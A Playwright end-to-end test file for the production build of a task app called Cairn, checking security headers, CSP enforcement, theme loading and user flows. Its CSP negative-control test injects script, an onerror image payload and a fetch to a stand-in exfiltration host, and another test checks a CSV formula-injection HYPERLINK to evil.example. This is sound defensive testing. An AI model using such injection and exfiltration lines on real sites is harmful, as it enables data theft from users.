/// <reference lib="dom" />
/** The real production build behind the real public/_headers (see playwright.prod.config.ts). */
import { execFile } from 'node:child_process'
import { createHash } from 'node:crypto'
import { existsSync, readdirSync, readFileSync, rmSync, statSync } from 'node:fs'
import { join } from 'node:path'
import { promisify } from 'node:util'
import { expect, type Browser, type Page } from '@playwright/test'
import { WORKSPACE_KEY, expectNoInjection, openSeeded, XSS } from '../e2e/security.helpers.ts'
import { BUILD_DIR, CANARY } from '../playwright.prod.config.ts'
import { forgetExpectedProblems, test } from './fixtures.ts'

const PREFS_KEY = 'cairn:ui-prefs'
const LOCAL_LABEL = 'Local only — not synced'

test.use({ timezoneId: 'Asia/Taipei', locale: 'en-US', colorScheme: 'light' })

const syncLabel = (page: Page) => page.getByRole('button', { name: `Sync status: ${LOCAL_LABEL}` })

function builtFiles(dir = BUILD_DIR): string[] {
  return readdirSync(dir, { recursive: true, encoding: 'utf8' })
    .map((name) => join(dir, name))
    .filter((path) => statSync(path).isFile())
}

test.describe('the host', () => {
  test('every response carries public/_headers; deep links get the app; assets are immutable', async ({
    request,
  }) => {
    const file = readFileSync('public/_headers', 'utf8')
    const csp = /Content-Security-Policy: (.*)/.exec(file)?.[1]
    for (const path of ['/', '/overview', '/projects/abc/gantt?task=x', '/nonsense/deep/path']) {
      const res = await request.get(path)
      expect(res.status(), path).toBe(200)
      const headers = res.headers()
      expect(headers['content-type'], path).toContain('text/html')
      expect(headers['content-security-policy'], path).toBe(csp)
      expect(headers['x-content-type-options'], path).toBe('nosniff')
      expect(headers['x-frame-options'], path).toBe('DENY')
      expect(headers['referrer-policy'], path).toBe('strict-origin-when-cross-origin')
      expect(headers['permissions-policy'], path).toContain('camera=()')
      expect(headers['strict-transport-security'], path).toContain('max-age=')
      expect(await res.text(), path).toContain('<div id="root"></div>')
    }
    const html = await (await request.get('/')).text()
    const asset = /src="(\/assets\/[^"]+\.js)"/.exec(html)?.[1] as string
    const res = await request.get(asset)
    expect(res.headers()['cache-control']).toBe('public, max-age=31536000, immutable')
    expect(res.headers()['content-type']).toContain('javascript')
  })

  test('the built inline theme script matches the hash in the CSP', async ({ request }) => {
    const res = await request.get('/')
    const html = await res.text()
    const scripts = [...html.matchAll(/<script(?![^>]*\bsrc=)[^>]*>([\s\S]*?)<\/script>/g)].map(
      (m) => m[1],
    )
    expect(scripts).toHaveLength(1)
    const hash = createHash('sha256').update(scripts[0]).digest('base64')
    expect(res.headers()['content-security-policy']).toContain(`'sha256-${hash}'`)
  })

  test('negative control: the browser really enforces the CSP here', async ({ page, problems }) => {
    await page.goto('/overview')
    await expect(page.getByRole('complementary', { name: 'Sidebar' })).toBeVisible()
    const out = await page.evaluate(async () => {
      const seen: string[] = []
      document.addEventListener('securitypolicyviolation', (e) => seen.push(e.effectiveDirective))
      const script = document.createElement('script')
      script.textContent = 'window.__injected = 1'
      document.head.append(script)
      const host = document.createElement('div')
      host.innerHTML = '<img src="x" onerror="window.__injected = 2">'
      document.body.append(host)
      let blockedFetch = false
      try {
        await fetch('https://evil.example/steal', { mode: 'no-cors' })
      } catch {
        blockedFetch = true
      }
      await new Promise((r) => setTimeout(r, 300))
      host.remove()
      return {
        injected: (window as unknown as { __injected?: number }).__injected ?? null,
        seen,
        blockedFetch,
      }
    })
    expect(out.injected).toBeNull()
    expect(out.blockedFetch).toBe(true)
    expect(out.seen).toEqual(
      expect.arrayContaining(['script-src-elem', 'script-src-attr', 'connect-src']),
    )
    await forgetExpectedProblems(page, problems)
  })
})

test.describe('what the bundle ships', () => {
  test('no test hooks, no unused VITE_ variable, no source maps; _headers is deployed', async ({
    page,
  }) => {
    const files = builtFiles()
    expect(files.some((path) => path.endsWith('_headers'))).toBe(true)
    expect(files.filter((path) => path.endsWith('.map'))).toEqual([])
    const texts = files
      .filter((path) => /\.(js|css|html)$/.test(path))
      .map((path) => readFileSync(path, 'utf8'))
    expect(texts.length).toBeGreaterThan(5)
    expect(texts.filter((text) => text.includes('__cairnTest'))).toEqual([])
    expect(texts.filter((text) => text.includes(CANARY))).toEqual([])

    await page.goto('/overview')
    await expect(syncLabel(page)).toBeVisible()
    expect(
      await page.evaluate(
        () => typeof (window as unknown as { __cairnTest?: unknown }).__cairnTest,
      ),
    ).toBe('undefined')
  })

  test('a secret key in any VITE_ variable stops the build, before anything is written', async () => {
    const outDir = 'test-results/prod-build-refused'
    rmSync(outDir, { recursive: true, force: true })
    const build = promisify(execFile)(
      'npx',
      ['vite', 'build', '--outDir', outDir, '--logLevel', 'error'],
      {
        env: { ...process.env, VITE_ANYTHING_AT_ALL: 'sb_secret_canary' },
      },
    )
    await expect(build).rejects.toMatchObject({
      stderr: expect.stringContaining('Refusing to build'),
    })
    expect(existsSync(outDir)).toBe(false)
  })
})

test.describe('theme before first paint (JS held back)', () => {
  async function firstPaintState(
    browser: Browser,
    baseURL: string,
    scheme: 'light' | 'dark',
    stored: string | null,
  ) {
    const context = await browser.newContext({ colorScheme: scheme, baseURL })
    const page = await context.newPage()
    await page.addInitScript(
      ({ key, value }) => {
        if (value !== null) localStorage.setItem(key, value)
      },
      { key: PREFS_KEY, value: stored },
    )
    let release = () => {}
    const gate = new Promise<void>((resolve) => {
      release = resolve
    })
    await page.route('**/assets/*.js', async (route) => {
      await gate
      await route.continue()
    })
    await page.goto('/overview', { waitUntil: 'commit' })
    await page.waitForFunction(() =>
      [...document.styleSheets].some((s) => s.href?.includes('/assets/')),
    )
    const read = () =>
      page.evaluate(() => ({
        dark: document.documentElement.classList.contains('dark'),
        background: getComputedStyle(document.body).backgroundColor,
      }))
    const before = await read()
    expect(await page.evaluate(() => document.getElementById('root')?.childElementCount)).toBe(0)
    release()
    await expect(page.getByRole('complementary', { name: 'Sidebar' })).toBeVisible()
    expect(await read(), 'no flip once React took over').toEqual(before)
    await context.close()
    return before
  }

  test('the stored theme, or the OS theme, is there before any JS runs', async ({
    browser,
    baseURL,
  }) => {
    const prefs = (theme: string) => JSON.stringify({ theme, sidebarCollapsed: false })
    const backgrounds = { dark: new Set<string>(), light: new Set<string>() }
    for (const [scheme, stored, dark] of [
      ['light', prefs('dark'), true],
      ['dark', prefs('light'), false],
      ['dark', prefs('system'), true],
      ['light', prefs('system'), false],
      ['dark', null, true],
      ['light', null, false],
      ['light', 'not json {', false],
    ] as const) {
      const state = await firstPaintState(browser, baseURL as string, scheme, stored)
      expect(state.dark, `${scheme} OS, stored ${stored}`).toBe(dark)
      backgrounds[dark ? 'dark' : 'light'].add(state.background)
    }
    expect(backgrounds.dark.size).toBe(1)
    expect(backgrounds.light.size).toBe(1)
    expect([...backgrounds.dark][0]).not.toBe([...backgrounds.light][0])
  })
})

test.describe('main flows', () => {
  test('from an empty browser: project, task, every view and page, reloads on deep links', async ({
    page,
  }) => {
    const assets: string[] = []
    page.on('response', (res) => {
      if (/\/assets\/.*\.(js|css|woff2)$/.test(res.url())) {
        assets.push(res.url())
        expect(res.status()).toBe(200)
      }
    })
    await page.goto('/')
    await expect(page).toHaveURL(/\/overview$/)
    await expect(syncLabel(page)).toBeVisible()

    await page.getByRole('link', { name: 'Projects' }).first().click()
    await page
      .getByRole('button', { name: /New project/ })
      .first()
      .click()
    const dialog = page.getByRole('dialog', { name: /New project/i })
    await dialog.getByLabel(/name/i).first().fill('Prod flow')
    await dialog.getByRole('button', { name: /Create/ }).click()
    await expect(page).toHaveURL(/\/projects\/[^/]+\/list$/)
    const project = new URL(page.url()).pathname.replace(/\/list$/, '')

    await page
      .getByRole('button', { name: /Add task|New task/ })
      .first()
      .click()
    await page.keyboard.type('First task')
    await page.keyboard.press('Enter')
    await expect(page.getByRole('main').getByText('First task', { exact: true })).toBeVisible()
    await expect
      .poll(() => page.evaluate((k) => localStorage.getItem(k) ?? '', WORKSPACE_KEY))
      .toContain('First task')

    // The task modal's deep link survives a reload.
    await page.getByRole('main').getByText('First task', { exact: true }).click()
    await expect(page).toHaveURL(/\?task=/)
    const deepLink = page.url()
    await page.reload()
    await expect(page).toHaveURL(deepLink)
    await expect(page.getByRole('dialog').first()).toBeVisible()
    await page.keyboard.press('Escape')
    await expect(page.getByRole('dialog')).toHaveCount(0)

    for (const view of ['board', 'gantt', 'list']) {
      await page.goto(`${project}/${view}`)
      await expect(page.getByRole('main').getByText('First task').first()).toBeVisible()
      await page.reload()
      await expect(page.getByRole('main').getByText('First task').first()).toBeVisible()
      await expect(page).toHaveURL(new RegExp(`/${view}$`))
    }
    for (const path of [
      '/overview',
      '/my-tasks/today',
      '/my-tasks/all',
      '/timeline',
      '/projects',
      '/settings/account',
      '/settings/appearance',
      '/settings/data',
    ]) {
      await page.goto(path)
      await expect(page).toHaveURL(new RegExp(`${path}$`))
      await expect(page.getByRole('main').locator('[aria-busy="true"]')).toHaveCount(0)
      await expect(syncLabel(page), path).toBeVisible()
      await expect(page.getByRole('heading').first()).toBeVisible()
    }
    // Fonts and lazy route chunks really came through the CSP.
    for (const name of [/\.woff2$/, /BoardView-/, /GanttView-/, /TimelinePage-/, /SettingsPage-/]) {
      expect(
        assets.some((url) => name.test(url)),
        String(name),
      ).toBe(true)
    }
  })

  test('board drag, downloads and a hostile workspace pass the CSP', async ({ page }) => {
    await openSeeded(page, '/projects/p1/board')
    await expectNoInjection(page, 'board')
    const card = page.getByRole('main').getByText('Plain task')
    const from = (await card.boundingBox()) as {
      x: number
      y: number
      width: number
      height: number
    }
    const done = page.getByRole('main').getByText('Done', { exact: true }).first()
    const to = (await done.boundingBox()) as { x: number; y: number; width: number; height: number }
    await page.mouse.move(from.x + from.width / 2, from.y + from.height / 2)
    await page.mouse.down()
    await page.mouse.move(from.x + from.width / 2 + 20, from.y + from.height / 2 + 10, { steps: 4 })
    await page.mouse.move(to.x + to.width / 2, to.y + 80, { steps: 10 })
    await page.mouse.up()
    await expect
      .poll(() =>
        page.evaluate(
          (k) =>
            (
              JSON.parse(localStorage.getItem(k) ?? '{}') as {
                tasks: Record<string, { status: string }>
              }
            ).tasks.t3.status,
          WORKSPACE_KEY,
        ),
      )
      .toBe('done')

    await page.goto('/settings/data')
    const [json] = await Promise.all([
      page.waitForEvent('download'),
      page.getByRole('button', { name: 'Export JSON backup' }).click(),
    ])
    expect(JSON.parse(readFileSync(await json.path(), 'utf8')).data.projects[0].name).toContain(XSS)
    const [csv] = await Promise.all([
      page.waitForEvent('download'),
      page.getByRole('button', { name: 'Export tasks CSV' }).click(),
    ])
    expect(readFileSync(await csv.path(), 'utf8')).toContain(
      `"'=HYPERLINK(""http://evil.example"",""x"")"`,
    )
  })

  test('malformed percent-encoding in a URL does not crash the app', async ({ page }) => {
    for (const path of [
      '/projects/%E0%A4%A/list',
      '/%',
      '/projects/%/list',
      '/overview?task=%E0%A4%A',
    ]) {
      await page.goto(path)
      await expect(page.getByRole('complementary', { name: 'Sidebar' }), path).toBeVisible()
      await expect(page.getByRole('main').getByText('Something went wrong'), path).toHaveCount(0)
    }
  })

  test('a chunk gone after a deploy: one reload, then a Reload button, never a white screen', async ({
    page,
    problems,
  }) => {
    await openSeeded(page, '/overview')
    let loads = 0
    page.on('load', () => {
      loads += 1
    })
    await page.route('**/assets/TimelinePage-*.js', (route) =>
      route.fulfill({
        status: 200,
        contentType: 'text/html',
        body: '<!doctype html><title>x</title>',
      }),
    )
    await page.getByRole('link', { name: 'Timeline' }).first().click()
    await expect.poll(() => loads).toBe(1)
    await expect(page.getByRole('complementary', { name: 'Sidebar' })).toBeVisible()
    await page.getByRole('link', { name: 'Timeline' }).first().click()
    await expect(page.getByRole('main')).toContainText('A new version of Cairn is available', {
      timeout: 15_000,
    })
    expect(loads).toBe(1)
    await page.unroute('**/assets/TimelinePage-*.js')
    await page.getByRole('button', { name: 'Reload' }).click()
    await expect(page).toHaveURL(/\/timeline$/)
    await expect(page.getByRole('main').getByText('A new version')).toHaveCount(0)
    // The browser logged the module failures this test provoked.
    await forgetExpectedProblems(page, problems)
  })
})

test('local mode is labelled on every page, expanded, collapsed and narrow', async ({ page }) => {
  await openSeeded(page, '/overview')
  for (const path of [
    '/my-tasks/today',
    '/projects',
    '/projects/p1/list',
    '/projects/p1/board',
    '/projects/p1/gantt',
    '/timeline',
    '/settings/account',
    '/settings/data',
    '/nonsense',
    '/projects/unknown/list',
  ]) {
    await page.goto(path)
    await expect(syncLabel(page), path).toContainText(LOCAL_LABEL)
    await expect(page.getByText(/^Saved$/)).toHaveCount(0)
  }
  await syncLabel(page).click()
  await expect(page.getByText('Stored in this browser only', { exact: true })).toBeVisible()
  await page.keyboard.press('Escape')

  // Collapsed rail: the accessible name stays, the tooltip shows the label.
  await page.goto('/overview')
  await page.getByRole('button', { name: /Collapse sidebar/ }).click()
  await expect(page.getByRole('complementary', { name: 'Sidebar' })).toHaveAttribute(
    'data-collapsed',
    'true',
  )
  await syncLabel(page).hover()
  await expect(page.getByRole('tooltip').filter({ hasText: LOCAL_LABEL }).first()).toBeVisible()

  for (const width of [1024, 600, 400]) {
    await page.setViewportSize({ width, height: 800 })
    await page.goto('/overview')
    await expect(syncLabel(page), `width ${width}`).toBeVisible()
  }
})
